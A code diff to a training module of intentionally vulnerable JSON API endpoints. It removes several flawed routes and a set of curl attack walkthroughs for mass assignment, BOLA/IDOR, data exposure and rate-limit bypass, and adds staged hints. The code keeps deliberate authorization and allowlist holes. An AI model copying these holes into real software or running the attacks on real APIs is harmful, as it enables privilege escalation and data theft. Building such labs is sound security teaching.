@@ -1,7 +1,7 @@
 // API Security Flaws module: intentionally vulnerable JSON API training targets.
 const express = require('express');
 const { getDb } = require('../../lib/db');
-const { page, esc, flagBox, hintBox, brief } = require('../../lib/page');
+const { brief, esc, fixPanel, flagBox, hintBox, hintLadder, page, toolsPill, trackBanner } = require('../../lib/page');
 const { award, captured, flagFor } = require('../../lib/flags');
 
 const router = express.Router();
@@ -105,7 +105,7 @@ router.get('/users/view', (req, res) => {
   if (json.includes('"password"')) {
     flagHtml = flagBox(award(req, 'api', 'exposure'));
   } else if (captured(req, 'api', 'exposure')) {
-    flagHtml = flagBox(flagFor('api', 'exposure'));
+    flagHtml = flagBox(flagFor('api', 'exposure')) + fixPanel('api', 'exposure');
   }
   res.send(page('API: excessive data', `
     ${brief('Excessive Data Exposure', `This page renders the raw response of <code>GET /api/users</code>.
@@ -134,59 +134,6 @@ router.post('/login', (req, res) => {
   res.json({ ok, attempts: attempts[key], flag });
 });
 
-// ---------- v4: BOLA on orders ----------
-router.get('/v1/orders/:id', (req, res) => {
-  const user = requireLogin(req, res);
-  if (!user) return;
-  const order = getDb().prepare('SELECT * FROM orders WHERE id = ?').get(req.params.id);
-  if (!order) return res.status(404).json({ ok: false, error: 'No such order.' });
-  // VULN: broken object-level authorization. The :id is trusted and ownership
-  // is never checked, so any logged-in user can read anyone's order.
-  let flag = null;
-  if (order.user_id !== user.id) {
-    flag = award(req, 'api', 'bola-orders');
-  }
-  res.json({ ok: true, order, flag });
-});
-
-// ---------- v5: mass assignment of role on any user ----------
-router.patch('/v1/users/:id', (req, res) => {
-  const user = requireLogin(req, res);
-  if (!user) return;
-  const body = req.body || {};
-  const keys = Object.keys(body);
-  if (keys.length === 0) return res.status(400).json({ ok: false, error: 'Empty JSON body.' });
-  const db = getDb();
-  // VULN: mass assignment with no allowlist. Every key in the JSON body,
-  // including "role", becomes a column in the UPDATE for any user id.
-  const setClause = keys.map((k) => `"${k}" = ?`).join(', ');
-  const values = keys.map((k) => body[k]);
-  db.prepare(`UPDATE users SET ${setClause} WHERE id = ?`).run(...values, req.params.id);
-  const updated = db.prepare('SELECT id, username, email, role FROM users WHERE id = ?').get(req.params.id);
-  let flag = null;
-  if (updated && updated.role === 'admin') {
-    flag = award(req, 'api', 'mass-assign-role');
-  }
-  res.json({ ok: true, user: updated, flag });
-});
-
-// ---------- v6: api_secret exposed on the profile endpoint ----------
-router.get('/v1/me', (req, res) => {
-  const user = requireLogin(req, res);
-  if (!user) return;
-  const db = getDb();
-  const row = db.prepare('SELECT id, username, email, role FROM users WHERE id = ?').get(user.id);
-  const prof = db.prepare('SELECT api_secret FROM api_profiles WHERE user_id = ?').get(user.id);
-  // VULN: excessive data exposure. The secret API key is bundled into the
-  // profile response and handed to any client that asks.
-  const me = Object.assign({}, row, { api_secret: prof ? prof.api_secret : null });
-  let flag = null;
-  if (me.api_secret) {
-    flag = award(req, 'api', 'data-exposure-keys');
-  }
-  res.json({ ok: true, me, flag });
-});
-
 // ---------- v7: rate limit keyed by spoofable X-Forwarded-For ----------
 router.post('/v1/login', (req, res) => {
   const { username, password } = req.body || {};
@@ -210,27 +157,6 @@ router.post('/v1/login', (req, res) => {
     req.session.user = { id: dbUser.id, username: dbUser.username, role: dbUser.role };
   }
   res.json({ ok, attempts: v1LoginAttempts[key], flag });
-});
-
-// ---------- v8: unsafe PUT overwrites read-only profile fields ----------
-router.put('/v1/profile', (req, res) => {
-  const user = requireLogin(req, res);
-  if (!user) return;
-  const body = req.body || {};
-  const keys = Object.keys(body);
-  if (keys.length === 0) return res.status(400).json({ ok: false, error: 'Empty JSON body.' });
-  const db = getDb();
-  // VULN: PUT replaces the profile object and copies every client-supplied
-  // key, including the read-only is_admin flag the UI never sends.
-  const setClause = keys.map((k) => `"${k}" = ?`).join(', ');
-  const values = keys.map((k) => body[k]);
-  db.prepare(`UPDATE api_profiles SET ${setClause} WHERE user_id = ?`).run(...values, user.id);
-  const prof = db.prepare('SELECT user_id, display_name, bio, is_admin FROM api_profiles WHERE user_id = ?').get(user.id);
-  let flag = null;
-  if (prof && Number(prof.is_admin) === 1) {
-    flag = award(req, 'api', 'unsafe-put');
-  }
-  res.json({ ok: true, profile: prof, flag });
 });
 
 // ---------- v9: v2 forgot the authorization check that v1 enforces ----------
@@ -264,42 +190,6 @@ router.get('/v2/users/:id', (req, res) => {
   res.json({ ok: true, user: target, flag });
 });
 
-// ---------- v10: sequential invoice ids with no ownership check ----------
-router.get('/v1/invoices/:id', (req, res) => {
-  const user = requireLogin(req, res);
-  if (!user) return;
-  const inv = getDb().prepare('SELECT * FROM api_invoices WHERE id = ?').get(req.params.id);
-  if (!inv) return res.status(404).json({ ok: false, error: 'No such invoice.' });
-  // VULN: predictable sequential ids plus missing ownership check. Enumerate
-  // :id and you read other users' invoices.
-  let flag = null;
-  if (inv.user_id !== user.id) {
-    flag = award(req, 'api', 'id-enumeration');
-  }
-  res.json({ ok: true, invoice: inv, flag });
-});
-
-// ---------- v11: PATCH self-update with no allowlist ----------
-router.patch('/v1/me', (req, res) => {
-  const user = requireLogin(req, res);
-  if (!user) return;
-  const body = req.body || {};
-  const keys = Object.keys(body);
-  if (keys.length === 0) return res.status(400).json({ ok: false, error: 'Empty JSON body.' });
-  const db = getDb();
-  // VULN: no allowlist on the self-update. display_name and bio are expected,
-  // but is_admin is accepted and persisted just the same.
-  const setClause = keys.map((k) => `"${k}" = ?`).join(', ');
-  const values = keys.map((k) => body[k]);
-  db.prepare(`UPDATE api_profiles SET ${setClause} WHERE user_id = ?`).run(...values, user.id);
-  const prof = db.prepare('SELECT user_id, display_name, bio, is_admin FROM api_profiles WHERE user_id = ?').get(user.id);
-  let flag = null;
-  if (prof && Number(prof.is_admin) === 1) {
-    flag = award(req, 'api', 'patch-self-admin');
-  }
-  res.json({ ok: true, profile: prof, flag });
-});
-
 // GET /api -> module index page.
 router.get('/', (req, res) => {
   const who = req.session.user ? esc(req.session.user.username) : 'nobody';
@@ -308,22 +198,32 @@ router.get('/', (req, res) => {
       <div class="vuln">
         <h3>${esc(v.name)} <span class="diff">${esc(v.difficulty)}</span></h3>
         <p>${esc(v.how)}</p>
-        ${hintBox(v.hint)}
+        ${hintLadder(v)}
+      ${toolsPill(v)}
       </div>`)
     .join('');
 
-  res.send(page('API Security Flaws', `
+  res.send(page('Acme API Docs', `
     ${brief('API Security Flaws', `
-      A tiny JSON API with eleven classic flaws: <b>mass assignment</b> on the profile
-      endpoint, <b>excessive data exposure</b> on the user list, a login endpoint
-      with <b>no rate limiting</b>, plus <b>BOLA</b> on orders and invoices,
-      <b>role mass assignment</b>, <b>API key exposure</b>, a <b>rate limit bypassed
-      via X-Forwarded-For</b>, <b>unsafe PUT</b> and <b>PATCH</b> privilege escalation,
-      and a <b>v2 endpoint that forgot its authorization check</b>. You are currently
-      logged in as <b>${who}</b>.
+      A tiny JSON API for a fictional startup. The endpoints below are the
+      public surface; your job is to find where the API trusts the client too
+      much. You are currently logged in as <b>${who}</b>.
       Flags for the JSON endpoints arrive in the response body (<code>"flag"</code>)
-      or the <code>X-Pentrix-Flag</code> response header (use <code>curl -i</code>),
-      or claim them in your browser at the links below.`)}
+      or the <code>X-Pentrix-Flag</code> response header (use <code>curl -i</code>).`)}
+    ${trackBanner(module.exports)}
+
+    <h3>Endpoints</h3>
+    <table>
+      <tr><th>Method</th><th>Path</th><th>Description</th></tr>
+      <tr><td>GET</td><td><code>/api/login/:user</code></td><td>Log in as a user (demo only)</td></tr>
+      <tr><td>POST</td><td><code>/api/login</code></td><td>Log in with username and password (JSON)</td></tr>
+      <tr><td>GET</td><td><code>/api/me</code></td><td>Your profile</td></tr>
+      <tr><td>PATCH</td><td><code>/api/me</code></td><td>Update your profile (JSON)</td></tr>
+      <tr><td>GET</td><td><code>/api/users</code></td><td>List users</td></tr>
+      <tr><td>GET</td><td><code>/api/v1/login</code></td><td>Log in (v1, rate limited)</td></tr>
+      <tr><td>GET</td><td><code>/api/v1/users/:id</code></td><td>Get user by id (v1)</td></tr>
+      <tr><td>GET</td><td><code>/api/v2/users/:id</code></td><td>Get user by id (v2)</td></tr>
+    </table>
 
     <h3>Quick login</h3>
     <p>
@@ -331,77 +231,10 @@ router.get('/', (req, res) => {
       <a class="btn" href="/api/users/view">View user list (browser)</a>
     </p>
 
-    <h3>Attack 1: mass assignment (become admin)</h3>
-    <pre>curl -c c.txt http://localhost:3000/api/login/alice
-curl -b c.txt -X PATCH http://localhost:3000/api/me \\
-  -H 'Content-Type: application/json' \\
-  -d '{"role":"admin"}'</pre>
-
-    <h3>Attack 2: excessive data exposure</h3>
-    <pre>curl -i http://localhost:3000/api/users
-# the JSON contains every password and secret; the flag is in X-Pentrix-Flag</pre>
-
-    <h3>Attack 3: credential stuffing (no rate limit)</h3>
-    <pre>for w in wrong1 wrong2 ... ; do
-  curl -s -X POST http://localhost:3000/api/login \\
-    -H 'Content-Type: application/json' -d "{\"username\":\"alice\",\"password\":\"$w\"}" >/dev/null
-done
-curl -s -X POST http://localhost:3000/api/login \\
-  -H 'Content-Type: application/json' \\
-  -d '{"username":"alice","password":"alice123"}'
-# flag is awarded once the 15th+ attempt is the successful one</pre>
-
-    <h3>Attack 4: BOLA on orders</h3>
-    <pre>curl -c c.txt http://localhost:3000/api/login/alice
-curl -b c.txt http://localhost:3000/api/v1/orders/1   # your own order
-curl -b c.txt http://localhost:3000/api/v1/orders/2   # someone else's order</pre>
-
-    <h3>Attack 5: mass assignment of role</h3>
-    <pre>curl -c c.txt http://localhost:3000/api/login/alice
-curl -b c.txt -X PATCH http://localhost:3000/api/v1/users/2 \\
-  -H 'Content-Type: application/json' \\
-  -d '{"role":"admin"}'</pre>
-
-    <h3>Attack 6: API key exposure</h3>
-    <pre>curl -c c.txt http://localhost:3000/api/login/alice
-curl -b c.txt http://localhost:3000/api/v1/me
-# read the api_secret field in the JSON response</pre>
-
-    <h3>Attack 7: rate limit bypass via X-Forwarded-For</h3>
-    <pre># burn the 3 attempts for your real IP on POST /api/v1/login
-for i in 1 2 3 4; do
-  curl -s -X POST http://localhost:3000/api/v1/login \\
-    -H 'Content-Type: application/json' \\
-    -d '{"username":"alice","password":"wrong"}'
-done
-# locked out? change your "IP" and log in for real
-curl -s -X POST http://localhost:3000/api/v1/login \\
-  -H 'Content-Type: application/json' -H 'X-Forwarded-For: 10.9.9.9' \\
-  -d '{"username":"alice","password":"alice123"}'</pre>
-
-    <h3>Attack 8: unsafe PUT (read-only field overwrite)</h3>
-    <pre>curl -c c.txt http://localhost:3000/api/login/alice
-curl -b c.txt -X PUT http://localhost:3000/api/v1/profile \\
-  -H 'Content-Type: application/json' \\
-  -d '{"display_name":"alice","is_admin":1}'</pre>
-
-    <h3>Attack 9: v2 authorization bypass</h3>
-    <pre>curl -c c.txt http://localhost:3000/api/login/alice
-curl -b c.txt http://localhost:3000/api/v1/users/3   # 403, as it should be
-curl -b c.txt http://localhost:3000/api/v2/users/3   # same record, no check</pre>
-
-    <h3>Attack 10: invoice ID enumeration</h3>
-    <pre>curl -c c.txt http://localhost:3000/api/login/alice
-curl -b c.txt http://localhost:3000/api/v1/invoices/1   # yours
-curl -b c.txt http://localhost:3000/api/v1/invoices/2   # keep counting...</pre>
-
-    <h3>Attack 11: PATCH self-privilege escalation</h3>
-    <pre>curl -c c.txt http://localhost:3000/api/login/alice
-curl -b c.txt -X PATCH http://localhost:3000/api/v1/me \\
-  -H 'Content-Type: application/json' \\
-  -d '{"is_admin":1}'</pre>
-
-    <h3>Vulnerabilities in this module</h3>
+    <h3>Challenges</h3>
+    <p>Five flaws hide in the endpoints above. Each challenge card has a hint
+    ladder: level 1 nudges, level 2 teaches the technique, level 3 shows the
+    payload shape.</p>
     ${vulnList}
   `));
 });
@@ -410,14 +243,18 @@ module.exports = {
   id: 'api',
   name: 'API Security Flaws',
   tagline: 'Mass assignment, data exposure, and brute force on a JSON API.',
-  description: 'A small JSON API with three classic flaws: a profile endpoint that merges every client-supplied field (including role), a user-list endpoint that leaks full database rows, and a login endpoint with no rate limiting. All flags are awarded server-side on real exploitation.',
+  description: 'A small JSON API with five classic flaws: a profile endpoint that merges every client-supplied field, a user-list endpoint that leaks full database rows, a login endpoint with no rate limiting, a rate limit bypassed via X-Forwarded-For, and a v2 endpoint that forgot its authorization check. All flags are awarded server-side on real exploitation.',
   difficulty: 'Intermediate',
+  track: 'Advanced',
+  prerequisites: ['Auth and Sessions track', 'Injection track'],
   vulns: [
     {
       id: 'mass-assignment',
       name: 'Mass Assignment',
       difficulty: 'Medium',
       hint: 'PATCH /api/me builds its SQL SET clause from Object.keys(req.body). Nothing stops you from adding fields the form never showed you, like "role".',
+      hints: ["The PATCH /me endpoint updates your profile. What happens if you send fields the form never showed you?", "There is no allowlist: every key in the JSON body becomes a column in the UPDATE.", "Send a PATCH with a JSON body containing an extra privilege-related field."],
+      tools: "C",
       how: 'Log in as alice, then send a JSON body with an extra field that escalates your privilege.',
     },
     {
@@ -425,6 +262,8 @@ module.exports = {
       name: 'Excessive Data Exposure',
       difficulty: 'Easy',
       hint: 'GET /api/users runs SELECT * and returns the rows as JSON. Read the response body, or check the X-Pentrix-Flag response header.',
+      hints: ["The /users endpoint returns user objects. Compare what the UI shows versus what the JSON contains.", "The response includes fields the client should never see. APIs must return only what the client needs.", "Fetch /api/users and inspect the full JSON, including headers, for sensitive fields."],
+      tools: "B, C",
       how: 'Fetch the user list and read fields the client should never see.',
     },
     {
@@ -432,63 +271,27 @@ module.exports = {
       name: 'Missing Rate Limiting',
       difficulty: 'Medium',
       hint: 'POST /api/login counts attempts per username but never blocks them. Fire 14+ wrong guesses for alice, then log in with the right password on the 15th attempt.',
+      hints: ["The login endpoint counts attempts but never blocks them. What does that allow?", "Without throttling, you can try as many passwords as you want. The flag rewards persistence.", "Automate login attempts: many failures followed by a success triggers the award."],
+      tools: "P, C",
       how: 'Brute force alice\u2019s password; the flag is awarded when the successful login follows 15 or more attempts.',
-    },
-    {
-      id: 'bola-orders',
-      name: 'BOLA: Order Access',
-      difficulty: 'Medium',
-      hint: 'GET /api/v1/orders/:id fetches any order by id and never checks that the order belongs to you. Alice owns order 1. Who owns order 2?',
-      how: "Log in as alice, then fetch another user's order by id.",
-    },
-    {
-      id: 'mass-assign-role',
-      name: 'Mass Assignment: Role',
-      difficulty: 'Easy',
-      hint: 'PATCH /api/v1/users/:id builds its SQL SET clause from every key in your JSON body. The word "role" is just another key to the code.',
-      how: 'Log in as alice and PATCH your own user id with a JSON body that sets role to admin.',
-    },
-    {
-      id: 'data-exposure-keys',
-      name: 'API Key Exposure',
-      difficulty: 'Easy',
-      hint: 'GET /api/v1/me returns your profile plus a field the client should never see. Read the whole JSON response, not just the pretty parts.',
-      how: 'Log in as alice and fetch /api/v1/me; find the api_secret hiding in the response.',
     },
     {
       id: 'ratelimit-xff',
       name: 'Rate Limit Bypass via X-Forwarded-For',
       difficulty: 'Medium',
       hint: 'POST /api/v1/login locks an IP out after 3 bad attempts, but the "client IP" comes from the X-Forwarded-For header, which you control.',
+      hints: ["The rate limit is keyed by client IP. Where does the server get the IP from?", "It trusts a client-controlled header. If you can change your apparent IP, the limit resets.", "Send requests with a spoofed forwarding header, varying it per attempt."],
+      tools: "C",
       how: 'Trigger the lockout with bad passwords, then retry with the correct password and a spoofed X-Forwarded-For header.',
-    },
-    {
-      id: 'unsafe-put',
-      name: 'Unsafe PUT: Read-only Field Overwrite',
-      difficulty: 'Medium',
-      hint: 'PUT /api/v1/profile replaces your profile object and copies every key you send, including is_admin, which the UI never shows you.',
-      how: 'Log in as alice and PUT a profile body containing is_admin set to 1.',
     },
     {
       id: 'api-version-bypass',
       name: 'API Version AuthZ Bypass',
       difficulty: 'Medium',
       hint: 'GET /api/v1/users/:id checks that you only read your own record (unless admin). Somebody copy-pasted the route for v2 and forgot the check.',
+      hints: ["v1 checks that you only read your own record. v2 was added later by copying v1.", "Compare the authorization logic between versions. Copy-paste often drops the check.", "Request the same user id through v1 and v2; one of them forgets to verify ownership."],
+      tools: "C",
       how: 'Log in as alice, confirm v1 blocks you from reading user 3, then read the same record through v2.',
-    },
-    {
-      id: 'id-enumeration',
-      name: 'IDOR: Invoice Enumeration',
-      difficulty: 'Easy',
-      hint: 'Invoice ids are sequential integers and GET /api/v1/invoices/:id does not check ownership. If your invoice is id 1, whose is id 2?',
-      how: "Log in as alice and enumerate invoice ids until you read another user's invoice.",
-    },
-    {
-      id: 'patch-self-admin',
-      name: 'PATCH Self-Privilege Escalation',
-      difficulty: 'Medium',
-      hint: 'PATCH /api/v1/me is meant for display_name and bio, but there is no allowlist. is_admin is just another column to the UPDATE.',
-      how: 'Log in as alice and PATCH /api/v1/me with is_admin set to 1.',
     },
   ],
   router,
